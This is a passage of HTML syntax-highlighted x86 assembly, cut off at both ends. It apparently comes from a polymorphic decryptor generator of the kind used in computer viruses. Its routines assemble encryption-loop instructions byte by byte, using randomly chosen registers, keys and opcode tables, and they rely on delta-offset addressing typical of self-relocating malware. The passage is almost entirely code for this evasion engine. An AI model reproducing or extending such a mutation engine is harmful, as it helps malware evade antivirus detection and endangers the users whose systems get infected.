      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11111000b</span><span class="sc0">      </span><span class="sc1">; clear the place for preg</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">preg</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">; fill the preg</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">codeaddr</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; fill the code start value</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ok_procs</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">proc02</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; mov kreg, key</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11111000b</span><span class="sc0">      </span><span class="sc1">; clear the place for kreg</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kreg</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">; fill the kreg</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">key</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; fill the key value</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ok_procs</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">proc03</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; mov lreg, code_length/8</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11111000b</span><span class="sc0">      </span><span class="sc1">; clear the place for lreg</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">lreg</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">; fill the lreg</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">codelength</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; fill the code length value</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ok_procs</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">proc04</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; mov creg, [preg] (mainloop)</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc0">      </span><span class="sc1">; clear for pointer and code regs</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">preg</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                            </span><span class="sc1">; take care of [EBP] exception</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_ebp</span><span class="sc0">                          </span><span class="sc1">; (when we use [EBP] addressing</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;  mode, we need a suplemental</span><span class="sc0">
      </span><span class="sc6">stosb</span><span class="sc0">                                </span><span class="sc1">;  00 byte after the opcode</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                            </span><span class="sc1">;  and a 01000000b fill up - see</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;  (*))</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">; and fill them up...</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">creg</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                            </span><span class="sc1">; align like this: xxNNNxxx</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01000000b</span><span class="sc0">       </span><span class="sc1">; (*)</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">increment_flag</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">done_i04</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">not_ebp</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">; and fill them up...</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">creg</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                            </span><span class="sc1">; align like this: xxNNNxxx</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">done_i04</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mainlp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ok_procs</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">proc05</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; &lt;op1&gt; creg, kreg</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc0">      </span><span class="sc1">; clear for r/m and reg</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">creg</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; get creg,</span><span class="sc0">
      </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                            </span><span class="sc1">; align like this xxNNNxxx</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kreg</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">op1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">un_op_code1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ok_procs</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">proc06</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; &lt;op2&gt; creg, key2</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11111000b</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">creg</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; fill creg</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">key2</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; fill key</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">op2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">un_op_code3</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00000111b</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ok_procs</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">proc07</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; &lt;op3&gt; creg, [preg+4]</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">preg</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">creg</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">op3</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">un_op_code1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ok_procs</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">proc08</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; mov [preg], creg</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc0">      </span><span class="sc1">; clear for pointer and code regs</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">preg</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                            </span><span class="sc1">; take care of [EBP] exception</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_ebp2</span><span class="sc0">                         </span><span class="sc1">; (check proc04 for explanation)</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">stosb</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
